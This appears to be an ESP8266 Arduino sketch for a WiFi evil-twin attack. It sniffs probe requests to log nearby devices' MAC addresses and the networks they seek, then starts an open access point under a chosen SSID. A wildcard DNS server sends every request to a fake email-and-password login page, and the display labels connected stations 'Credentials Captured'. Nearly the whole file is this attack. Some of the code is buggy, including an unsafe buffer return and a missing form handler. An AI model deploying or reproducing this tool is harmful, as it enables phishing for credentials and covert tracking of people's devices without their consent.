extern "C" {
  #include <user_interface.h>
}
#include <ESP8266WiFi.h>
#include <Wire.h>  // Only needed for Arduino 1.6.5 and earlier
#include "SSD1306.h" // alias for `#include "SSD1306Wire.h"`
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <ClickButton.h>

SSD1306  display(0x3c, D5, D6);

#define DATA_LENGTH           112

#define TYPE_MANAGEMENT       0x00
#define TYPE_CONTROL          0x01
#define TYPE_DATA             0x02
#define SUBTYPE_PROBE_REQUEST 0x04
#define SUBTYPE_BEACON        0x08

#define STATE0_DURATION 10000
#define STATE2_DURATION  5000
typedef void (*Screen)(void);

struct RxControl {
 signed rssi:8; // signal intensity of packet
 unsigned rate:4;
 unsigned is_group:1;
 unsigned:1;
 unsigned sig_mode:2; // 0:is 11n packet; 1:is not 11n packet;
 unsigned legacy_length:12; // if not 11n packet, shows length of packet.
 unsigned damatch0:1;
 unsigned damatch1:1;
 unsigned bssidmatch0:1;
 unsigned bssidmatch1:1;
 unsigned MCS:7; // if is 11n packet, shows the modulation and code used (range from 0 to 76)
 unsigned CWB:1; // if is 11n packet, shows if is HT40 packet or not
 unsigned HT_length:16;// if is 11n packet, shows length of packet.
 unsigned Smoothing:1;
 unsigned Not_Sounding:1;
 unsigned:1;
 unsigned Aggregation:1;
 unsigned STBC:2;
 unsigned FEC_CODING:1; // if is 11n packet, shows if is LDPC packet or not.
 unsigned SGI:1;
 unsigned rxend_state:8;
 unsigned ampdu_cnt:8;
 unsigned channel:4; //which channel this packet in.
 unsigned:12;
};

struct SnifferPacket{
    struct RxControl rx_ctrl;
    uint8_t data[DATA_LENGTH];
    uint16_t cnt;
    uint16_t len;
};

struct SSID{
    String name;
    String MAClist[10];
    int uniques = 0;
    signed average_rssi;
};

struct SSID SSIDlist[10];

int SSIDcount = 0;

const int LEDpin = D0;

int numberOfInterrupts = 0;
volatile byte interruptCounter = 0;
const int interruptPin = D1;
ClickButton button2(interruptPin, LOW, CLICKBTN_PULLUP);

int numberOfInterrupts2 = 0;
volatile byte interrupt2Counter = 0;
const int interrupt2Pin = D2;
ClickButton button1(interrupt2Pin, LOW, CLICKBTN_PULLUP);

int screenState = 0;
int counter = 1;
long timeOfLastModeSwitch = 0;

const byte DNS_PORT = 53;  //THESE WERE BREAKING IT ???
IPAddress apIP(192, 168, 1, 1);
DNSServer dnsServer;
ESP8266WebServer webServer(80);

String responseHTML = ""
  "<!DOCTYPE html><html><head><title>CaptivePortal</title></head><body>"
  "<section class='loginform cf'>"
  "<form name='login' action='index_submit' method='get' accept-charset='utf-8'>"
  "<ul>"
  "<li><label for='usermail'>Email</label>"
    "<input type='email' name='usermail' placeholder='yourname@email.com' required></li>"
    "<li><label for='password'>Password</label>"
    "<input type='password' name='password' placeholder='password' required></li>"
    "<li>"
    "<input type='submit' value='Login'></li>"
  "</ul>"
"</form>"
"</section>"
"</body></html>";

static void showMetadata(SnifferPacket *snifferPacket) {

  unsigned int frameControl = ((unsigned int)snifferPacket->data[1] << 8) + snifferPacket->data[0];

  uint8_t version      = (frameControl & 0b0000000000000011) >> 0;
  uint8_t frameType    = (frameControl & 0b0000000000001100) >> 2;
  uint8_t frameSubType = (frameControl & 0b0000000011110000) >> 4;
  uint8_t toDS         = (frameControl & 0b0000000100000000) >> 8;
  uint8_t fromDS       = (frameControl & 0b0000001000000000) >> 9;
  uint8_t SSID_length  = snifferPacket->data[25];

  // Only look for probe request packets
  if (frameType != TYPE_MANAGEMENT || frameSubType != SUBTYPE_PROBE_REQUEST){
      return;
  }
  // Filter out broadcast probes
  if(SSID_length == 0){
      return;
  }


  String SSIDcurrent = getSSID(26, SSID_length, snifferPacket->data);
  printf("%s, ", SSIDcurrent.c_str());

  char *addr = "00:00:00:00:00:00";
  String MACcurrent = getMAC(addr, snifferPacket->data, 10);
  printf("%s, ", MACcurrent.c_str());

  //Matching logic, convert to function
  int match = 0;
  int trig = 0;
  int i = 0;
  int j = 0;
  for ( i = 0 ; i <= SSIDcount ; i++){
      if(SSIDcurrent == SSIDlist[i].name){
          trig++;
          match = i;
      }
  }
  if (trig == 0){
    //Limit to 10 SSIDs
    if (SSIDcount > 9){
        return;
    }
    SSIDcount++;
    match = SSIDcount;
    SSIDlist[SSIDcount].name = SSIDcurrent;
  }
  int matchMAC = 0;
  trig = 0;
  for ( j = 0 ; j <= SSIDlist[match].uniques ; j++){
      if(MACcurrent == SSIDlist[match].MAClist[j]){
          trig++;
          matchMAC = j;
      }
  }
  if (trig == 0){
    //Limit to 10 MACs to prevent overflow
    if (SSIDlist[match].uniques > 9){
        return;
    }
    SSIDlist[match].uniques++;
    SSIDlist[match].MAClist[SSIDlist[match].uniques] = MACcurrent;
  }

  //Sorting logic

  //sort(SSIDlist, SSIDlist[].uniques)

  struct SSID SSIDswap;

  for ( i = 1 ; i < SSIDcount - 1 ; i++){
      for ( j = 1 ; j < SSIDcount - i - 1 ; j++){
        if(SSIDlist[j].uniques < SSIDlist[j+1].uniques){
            SSIDswap = SSIDlist[j];
            SSIDlist[j] = SSIDlist[j+1];
            SSIDlist[j+1] = SSIDswap;
        }
      }
  }

  //Serial.print(snifferPacket->rx_ctrl.rssi, HEX);

  //Perform hex dump of captured packet to serial
  //hexDump(snifferPacket->data);

  printf("%d, ", SSIDlist[match].uniques);
  printf("%d, ", match);
  printf("%d\n", SSIDcount);

  // LED blink on probe request
  digitalWrite(LEDpin, LOW);


}

/**
 * Callback for promiscuous mode
 */
static void ICACHE_FLASH_ATTR sniffer_callback(uint8_t *buffer, uint16_t length) {
    struct SnifferPacket *snifferPacket = (struct SnifferPacket*) buffer;
    showMetadata(snifferPacket);
}

static String getSSID(uint16_t start, uint16_t size, uint8_t* data) {
    String ssid = "";
    char letter;
    for(uint16_t i = start; i < DATA_LENGTH && i < start+size; i++) {
        letter = data[i];
        ssid += letter;
    }
    return ssid;
}

static String getMAC(char *addr, uint8_t* data, uint16_t offset) {
    sprintf(addr, "%02x:%02x:%02x:%02x:%02x:%02x", data[offset+0], data[offset+1],
                    data[offset+2], data[offset+3], data[offset+4], data[offset+5]);
    String MAC(addr);
    return MAC;
}

/*static void hexDump(uint8_t* data){
    int j = 0;
    printf("000%02x  ", j);

    for(uint16_t i = 0; i < DATA_LENGTH ; i++) {
        j++;
        printf("%02x ", data[i]);
        if(j%8 == 0){
            Serial.print(" ");
        }
        if(j%16 == 0){
            Serial.println();
            printf("000%02x  ", j);
        }
    }
}*/

static char* stringToChar(String s){
    int buffer = 32; //s.length();
    char array[buffer];
    for(int i = 0; i <= buffer; i++){
        array[i] = s[i];
    }
    return array;
}

String scan = "Scanning.";
static void ICACHE_FLASH_ATTR displayScanning() {
  int progress = (counter) % 100;
    // draw the progress bar
  display.drawProgressBar(0, 32, 120, 10, progress);

  // draw the percentage as String
  display.setTextAlignment(TEXT_ALIGN_CENTER);
  //display.drawString(64, 15, String(progress) + "%");

  display.setTextAlignment(TEXT_ALIGN_LEFT);

  if (progress%10 == 0){
    if(progress%30 == 0){
      scan.remove(9, 2);
    }else{
      scan += ".";
    }
  }
  display.drawString(41, 5, scan);
}

static void ICACHE_FLASH_ATTR displaySSIDs() {
  display.setTextAlignment(TEXT_ALIGN_LEFT);
  display.drawString(0, 0, "SSID");
  display.drawString(90, 0, "uniques");
  String ap;

  if (numberOfInterrupts2 <= 4){
    for ( int i = 1 ; i <= 5 && i <= SSIDcount ; i++){
        display.drawRect(0, (numberOfInterrupts2+1)*10, 80, 12);
        ap = SSIDlist[i].name;
        if (ap.length() > 12){
            ap.remove(12, 20);
            ap += "...";
        }
        display.drawString(0, i*10, ap);
        display.drawString(90, i*10, String(SSIDlist[i].uniques));
    }
  }else{
    for ( int i = 1 ; i <= 5 && i <= SSIDcount-(4-i) ; i++){
        display.drawRect(0, 50, 80, 12);
        ap = SSIDlist[i+numberOfInterrupts2-4].name;
        if (ap.length() > 12){
            ap.remove(12, 20);
            ap += "...";
        }
        display.drawString(0, i*10, ap);
        display.drawString(90, i*10, String(SSIDlist[i+numberOfInterrupts2-4].uniques));
    }
  }
}

//int prog2 = 0;
static void ICACHE_FLASH_ATTR displayAPsetup() {
  // draw the progress bar
  //display.drawProgressBar(0, 32, 120, 10, progress);
  int progress = (counter*5) % 100;
  // draw the percentage as String
  display.setTextAlignment(TEXT_ALIGN_CENTER);
  //display.drawString(64, 15, String(progress) + "%");

  display.drawString(64, 15, "Setting up");
  display.drawString(64, 30, SSIDlist[numberOfInterrupts2+1].name + " Access Point");
  if (millis() - timeOfLastModeSwitch < 2700){
      display.drawProgressBar(32, 48, 60, 12, progress);
  }else{
      display.drawString(64, 46, "Ready");
  }
}

static void ICACHE_FLASH_ATTR displayKEYcapture(){
  display.setTextAlignment(TEXT_ALIGN_CENTER);
  //display.drawString(64, 15, String(progress) + "%");
  display.drawString(64, 0, "Captive portal on");
  display.drawString(64, 15, SSIDlist[numberOfInterrupts2+1].name + " Access Point");
  display.drawString(64, 30, "Credentials Captured:");
  display.drawString(64, 45, String(WiFi.softAPgetStationNum()));
}

static void captivePortal(){


  wifi_set_opmode(WIFI_AP);
  delay(10);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));

  delay(10);
  char *ap = stringToChar(SSIDlist[numberOfInterrupts2+1].name);
  WiFi.softAP(ap);
  //Serial.println(WiFi.softAP(ap) ? "Ready" : "Failed!");
  delay(10);
  // if DNSServer is started with "*" for domain name, it will reply with
  // provided IP to all DNS request
  dnsServer.start(DNS_PORT, "*", apIP);
  delay(10);
  // replay to all requests with same HTML
  webServer.onNotFound([]() {
    webServer.send(200, "text/html", responseHTML);
  });
  webServer.begin();

}

/*static void ICACHE_FLASH_ATTR handleInterrupt() {
  interruptCounter++;
}*/

/*static void ICACHE_FLASH_ATTR handleInterrupt2() {
  interrupt2Counter++;
}*/

#define CHANNEL_HOP_INTERVAL_MS   1000
static os_timer_t channelHop_timer;

/**
 * Callback for channel hoping
 */
void channelHop()
{
    // hoping channels 1-14
    uint8 new_channel = wifi_get_channel() + 1;
    if(new_channel > 14)
        new_channel = 1;
    wifi_set_channel(new_channel);
}

#define DISABLE 0
#define ENABLE  1

Screen screens[] = { displayScanning, displaySSIDs, displayAPsetup, displayKEYcapture};
int demoLength = (sizeof(screens) / sizeof(Screen));

void setup() {

    //Start serial connection
    Serial.begin(115200);
    pinMode(LEDpin, OUTPUT);
    digitalWrite(LEDpin, HIGH);
    // setup interrupt pins
    pinMode(interruptPin, INPUT_PULLUP);
    //ClickButton button1(interruptPin, LOW, CLICKBTN_PULLUP);
    //attachInterrupt(interruptPin, handleInterrupt, FALLING);
    pinMode(interrupt2Pin, INPUT_PULLUP);
    //attachInterrupt(interrupt2Pin, handleInterrupt2, FALLING);

    // set the WiFi chip to "promiscuous" mode aka monitor mode
    delay(10);
    wifi_set_opmode(STATION_MODE);
    wifi_set_channel(1);
    wifi_promiscuous_enable(DISABLE);
    delay(10);
    wifi_set_promiscuous_rx_cb(sniffer_callback);
    delay(10);
    wifi_promiscuous_enable(ENABLE);

    // setup the channel hoping callback timer
    os_timer_disarm(&channelHop_timer);
    os_timer_setfn(&channelHop_timer, (os_timer_func_t *) channelHop, NULL);
    os_timer_arm(&channelHop_timer, CHANNEL_HOP_INTERVAL_MS, 1);

    // Initialising the UI will init the display too.
    display.init();
    display.flipScreenVertically();
    display.setFont(ArialMT_Plain_10);
}

void loop() {

  button1.Update();
  button2.Update();

  // clear the display
  display.clear();
  // draw the current Screen method
  screens[screenState]();

  display.setTextAlignment(TEXT_ALIGN_RIGHT);
  display.drawString(10, 128, String(millis()));
  // write the buffer to the display
  display.display();

  if ((millis() - timeOfLastModeSwitch > STATE0_DURATION) && numberOfInterrupts == 0) {

    screenState = 1;
    timeOfLastModeSwitch = millis();
  }

  if(button1.clicks == 1 && numberOfInterrupts == 0){
    Serial.println("button clicked");
    //interrupt2Counter--;
    numberOfInterrupts2++;
  }

  if(numberOfInterrupts2 >= SSIDcount){
    numberOfInterrupts2 = 0;
  }

  if(button2.clicks == 1 && numberOfInterrupts == 0){

      //interruptCounter--;
      numberOfInterrupts++;

      //detachInterrupt(interruptPin);
      //detachInterrupt(interrupt2Pin);

      Serial.print("An interrupt has occurred. Total: ");
      Serial.println(numberOfInterrupts);

      wifi_promiscuous_enable(DISABLE);

      wifi_set_promiscuous_rx_cb(NULL);

      delay(10);

      screenState = 2;
      timeOfLastModeSwitch = millis();
      counter = 0;

      delay(10);

      captivePortal();

      delay(10);

      //WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
      Serial.print("Setting AP for ");
      Serial.print(SSIDlist[numberOfInterrupts2+1].name);
      Serial.print("...");
      /*char *ap = stringToChar(SSIDlist[numberOfInterrupts2+1].name, 32);
      Serial.println(WiFi.softAP(ap) ? "Ready" : "Failed!");*/

      //delay(10);

  }

  if ((millis() - timeOfLastModeSwitch > STATE2_DURATION) && numberOfInterrupts > 0) {

    screenState = 3;
    timeOfLastModeSwitch = millis();

  }

  if(numberOfInterrupts > 0){

      //Serial.printf("Stations connected = %d\n", WiFi.softAPgetStationNum());
      delay(10);
      dnsServer.processNextRequest();
      delay(10);
      webServer.handleClient();
      //delay(3000);
  }

  counter++;
  delay(100);
  digitalWrite(LEDpin, HIGH);

}
